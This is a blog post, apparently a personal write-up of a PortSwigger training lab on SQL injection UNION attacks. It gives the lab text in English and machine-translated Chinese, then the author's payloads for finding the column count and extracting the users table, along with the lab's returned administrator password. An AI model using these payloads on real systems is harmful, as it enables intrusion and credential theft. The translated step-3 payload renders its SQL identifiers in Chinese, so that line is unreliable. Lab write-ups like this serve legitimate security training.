---
layout: post
title: "SQL injection UNION attack, retrieving data from other tables"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---






# SQL injection UNION attack, retrieving data from other tables




```

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### Solution

1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
2.  Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3.  Use the following payload to retrieve the contents of the `users` table:
    
    `'+UNION+SELECT+username,+password+FROM+users--`
4.  Verify that the application's response contains usernames and passwords.



本實驗室在產品類別過濾器中包含一個 SQL 注入漏洞。查詢的結果在應用程序的響應中返回，因此您可以使用 UNION 攻擊從其他表中檢索數據。要構建這樣的攻擊，您需要結合您在之前的實驗室中學到的一些技術。

該數據庫包含一個名為“users”的不同表，其中包含名為“username”和“password”的列。

為了解決實驗室問題，執行 [SQL 注入 UNION](https://portswigger.net/web-security/sql-injection/union-attacks) 攻擊，檢索所有用戶名和密碼，並使用該信息以`管理員`用戶。

＃＃＃＃ 解決方案

1. 使用 Burp Suite 攔截和修改設置產品類別過濾器的請求。
2.確定[查詢返回的列數](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)和[which列包含文本數據](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)。驗證查詢是否返回兩列，這兩列都包含文本，在 category 參數中使用如下所示的有效負載：
    
    `'+UNION+SELECT+'abc','def'--`
3. 使用以下負載來檢索 `users` 表的內容：
    
    `'+UNION+SELECT+用戶名,+密碼+FROM+用戶--`
4. 驗證應用程序的響應是否包含用戶名和密碼。



```



get 請求
```
category=Lifestyle
```


測出來2個欄位
```
category=Lifestyle' UNION SELECT NULL--
//Internal Server Error


category=Lifestyle' UNION SELECT NULL,NULL--
//有回顯

```



兩個欄位都可以放字串。
```
category=Lifestyle' UNION SELECT 'aaa',NULL--
//有回顯

category=Lifestyle' UNION SELECT NULL,'aaa'--
//有回顯


```



題目說:
該數據庫包含一個名為“users”的不同表，其中包含名為“username”和“password”的列。


```
' UNION SELECT username,password FROM users--
```

回顯:
```
administrator

p2jwxyffebi7t33lsy2c
```


成功





